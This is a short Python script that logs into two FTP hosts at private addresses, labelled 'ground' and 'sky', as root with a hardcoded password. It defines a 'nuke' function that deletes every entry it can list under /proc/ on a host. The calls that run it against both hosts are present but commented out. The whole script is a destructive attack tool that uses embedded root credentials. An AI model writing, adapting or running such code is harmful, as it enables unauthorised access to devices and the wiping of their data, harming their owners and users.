#!/usr/bin/env python3

import ftplib

def nuke(ftp):
    for item in ftp.nlist('/proc/'):
        try:
            ftp.delete(item)
        except Exception:
            ftp.rmd(item)

ground = ftplib.FTP('192.168.1.1')
sky = ftplib.FTP('192.168.1.2')

ground.login('root', 'Big~9China')
sky.login('root', 'Big~9China')

#nuke(sky)
#nuke(ground)
